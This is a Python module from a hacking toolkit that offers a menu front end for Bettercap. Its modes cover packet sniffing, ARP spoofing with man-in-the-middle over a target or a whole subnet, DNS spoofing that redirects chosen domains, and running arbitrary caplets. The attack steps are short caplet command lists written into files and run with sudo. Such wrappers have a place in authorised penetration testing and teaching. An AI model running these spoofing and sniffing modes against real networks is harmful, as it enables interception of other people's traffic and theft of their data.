# Copyright (c) 2025-2026 v4lkyr0 — SINIX
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or distribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou distribuer sans autorisation écrite.

from Core.Utils import *
from Core.Config import *

try:
    import os
    import subprocess
    import shutil
    import sys
    import shlex
except Exception as e:
    MissingModule(e)

Title("Bettercap — Controller")



# ── Bettercap binary detection ───────────────────────────────────────────────

def find_bettercap():
    path = shutil.which("bettercap")
    if path:
        return path
    candidates = [
        os.path.join(tool_path, "Programs", "Bettercap", "bettercap.exe"),
        os.path.join(tool_path, "Programs", "Bettercap", "bettercap"),
        "/usr/local/bin/bettercap",
        "/usr/bin/bettercap",
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None

BETTERCAP_BIN = find_bettercap()

if not BETTERCAP_BIN:
    print(f"{ERROR} Bettercap binary not found!", reset)
    if platform_pc == "Windows":
        print(f"{INFO} Download: {green}https://github.com/bettercap/bettercap/releases{reset}", reset)
        print(f"{INFO} Get {green}bettercap_windows_amd64.zip{reset}, extract {green}bettercap.exe{reset}", reset)
    elif platform_pc == "Linux":
        print(f"{INFO} Install: {green}sudo apt install bettercap{reset}", reset)
    elif platform_pc == "macOS":
        print(f"{INFO} Install: {green}brew install bettercap{reset}", reset)
    print(f"{INFO} Or place the binary in: {green}{os.path.join(tool_path, 'Programs', 'Bettercap')}{reset}", reset)
    Continue()
    Reset()
    sys.exit()

print(f"{SUCCESS} Bettercap found: {green}{BETTERCAP_BIN}{reset}", reset)
print(f"{INFO} {yellow}Bettercap est en cours de développement — certaines fonctionnalités peuvent ne pas fonctionner.{reset}", reset)

# ── Interface listing (Windows: WinPcap GUIDs) ───────────────────────────────

def list_interfaces():
    try:
        result = subprocess.run(
            [BETTERCAP_BIN, "-list-ifaces"],
            capture_output=True, text=True, timeout=8
        )
        output = (result.stdout + result.stderr).strip()
        if output:
            print(f"\n{INFO} Available interfaces:\n", reset)
            for line in output.splitlines():
                print(f"   {green}{line}{reset}", reset)
            print()
    except Exception:
        pass

# ── Caplet writer ─────────────────────────────────────────────────────────────

def write_caplet(filename, lines):
    out_dir = os.path.join(tool_path, "Programs", "Output", "Bettercap")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, filename)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    return path

# ── Run bettercap ─────────────────────────────────────────────────────────────

def run_bettercap(iface, extra_args=None, caplet=None):
    cmd = [BETTERCAP_BIN, "-iface", iface, "-no-history"]
    if caplet:
        cmd += ["-caplet", caplet]
    if extra_args:
        cmd += extra_args
    if platform_pc != "Windows":
        cmd = ["sudo"] + cmd
    subprocess.run(cmd)

# ── Mode menu ─────────────────────────────────────────────────────────────────

list_interfaces()

print(f"""  {green}╓─────────────────────────────────────────────────────╖{reset}
  {green}║{white}                    Bettercap Modes                 {green}║{reset}
  {green}╙┬────────────────────────────────────────────────────╜{reset}
   {green}├─ {PREFIX1}1{SUFFIX1}{reset} Interactive Shell
   {green}├─ {PREFIX1}2{SUFFIX1}{reset} Network Sniffer
   {green}├─ {PREFIX1}3{SUFFIX1}{reset} ARP Spoof + MITM
   {green}├─ {PREFIX1}4{SUFFIX1}{reset} DNS Spoof
   {green}├─ {PREFIX1}5{SUFFIX1}{reset} Caplet Runner
   {green}└─ {PREFIX1}6{SUFFIX1}{reset} Custom Command
""", reset)

try:
    choice = input(f"{INPUT} Mode {green}->{reset} ").strip()

    if choice == "1":
        iface = input(f"{INPUT} Interface {green}->{reset} ").strip()
        if not iface:
            ErrorInput()
        print(f"\n{LOADING} Launching interactive shell on {green}{iface}{reset}...\n", reset)
        run_bettercap(iface)

    elif choice == "2":
        iface = input(f"{INPUT} Interface {green}->{reset} ").strip()
        if not iface:
            ErrorInput()
        output_pcap = input(f"{INPUT} Save PCAP to (leave empty to skip) {green}->{reset} ").strip()
        lines = ["net.sniff on"]
        if output_pcap:
            lines.append(f"set net.sniff.output {output_pcap}")
        caplet = write_caplet("sniff.cap", lines)
        print(f"\n{LOADING} Sniffer on {green}{iface}{reset}...\n", reset)
        run_bettercap(iface, caplet=caplet)

    elif choice == "3":
        iface  = input(f"{INPUT} Interface {green}->{reset} ").strip()
        target = input(f"{INPUT} Target IP (leave empty for full subnet) {green}->{reset} ").strip()
        if not iface:
            ErrorInput()
        lines = ["net.recon on", "net.sniff on"]
        if target:
            lines.append(f"set arp.spoof.targets {target}")
        lines += ["arp.spoof on", "set net.sniff.verbose false"]
        caplet = write_caplet("mitm.cap", lines)
        target_display = target if target else "full subnet"
        print(f"\n{LOADING} ARP spoof on {green}{target_display}{reset} via {green}{iface}{reset}...\n", reset)
        run_bettercap(iface, caplet=caplet)

    elif choice == "4":
        iface       = input(f"{INPUT} Interface {green}->{reset} ").strip()
        domains     = input(f"{INPUT} Domains to spoof (ex: *.example.com) {green}->{reset} ").strip()
        redirect_ip = input(f"{INPUT} Redirect to IP {green}->{reset} ").strip()
        if not iface or not domains or not redirect_ip:
            ErrorInput()
        lines = [
            "net.recon on",
            f"set dns.spoof.domains {domains}",
            f"set dns.spoof.address {redirect_ip}",
            "arp.spoof on",
            "dns.spoof on",
        ]
        caplet = write_caplet("dns.cap", lines)
        print(f"\n{LOADING} DNS spoof {green}{domains}{reset} → {green}{redirect_ip}{reset}...\n", reset)
        run_bettercap(iface, caplet=caplet)

    elif choice == "5":
        iface       = input(f"{INPUT} Interface {green}->{reset} ").strip()
        caplet_path = input(f"{INPUT} Caplet file path {green}->{reset} ").strip()
        if not iface or not caplet_path:
            ErrorInput()
        if not os.path.isfile(caplet_path):
            print(f"{ERROR} Caplet not found: {green}{caplet_path}{reset}", reset)
            Continue()
            Reset()
            sys.exit()
        print(f"\n{LOADING} Running {green}{caplet_path}{reset} on {green}{iface}{reset}...\n", reset)
        run_bettercap(iface, caplet=caplet_path)

    elif choice == "6":
        iface = input(f"{INPUT} Interface {green}->{reset} ").strip()
        extra = input(f"{INPUT} Extra flags (ex: -eval \"net.recon on\") {green}->{reset} ").strip()
        if not iface:
            ErrorInput()
        extra_args = shlex.split(extra) if extra else []
        print(f"\n{LOADING} Running custom command on {green}{iface}{reset}...\n", reset)
        run_bettercap(iface, extra_args=extra_args)

    else:
        ErrorChoice()

    Continue()
    Reset()

except KeyboardInterrupt:
    Reset()
except Exception as e:
    Error(e)
